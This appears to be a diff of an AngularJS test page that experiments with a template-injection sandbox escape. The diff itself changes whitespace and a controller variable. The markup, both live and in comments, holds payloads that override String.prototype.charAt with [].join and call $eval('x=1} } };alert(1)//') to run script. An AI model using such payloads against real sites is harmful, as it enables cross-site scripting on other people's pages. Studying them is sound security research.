@@ -3,14 +3,14 @@
     <head>
     </head>
 
-    <body> 
+    <body>
         <!-- <h1 ng-app="myApp" ng-controller="myCtrl"> we getting: {{ 'a'.constructor.prototype.charAt=[].join; 'abc'.charAt(1); $eval('1 + 1')}} </h1> -->
         <!-- <h1 ng-app="myApp" ng-controller="myCtrl"> we getting: {{ 'a'.constructor.prototype.charAt=[].join}} {{ $eval('x=alert(1)') }} </h1> -->
-        <h1 ng-app="myApp" ng-controller="myCtrl"> we getting: 
-            {{ 
-                'a'.constructor.prototype.charAt=[].join; 
+        <h1 ng-app="myApp" ng-controller="myCtrl"> we getting:
+            {{
+                'a'.constructor.prototype.charAt=[].join;
                 $eval('x=1} } };alert(1)//');
-            }} 
+            }}
         </h1>
     </body>
 
@@ -21,10 +21,10 @@
         app.controller('myCtrl', function($scope, $parse) {
             var key = 'search';
             $scope.query = {};
-            $scope.query[key] = ["testing", "was", "z", "a"];
+            $scope.query[key] = '666777';
             //$scope.query[key] = ['a', 4,1, 3, 'alert'];
             var fn = $parse(key);
-            $scope.ARR = fn($scope.query);
+            $scope.value = fn($scope.query);
         });
     </script>
 </html>
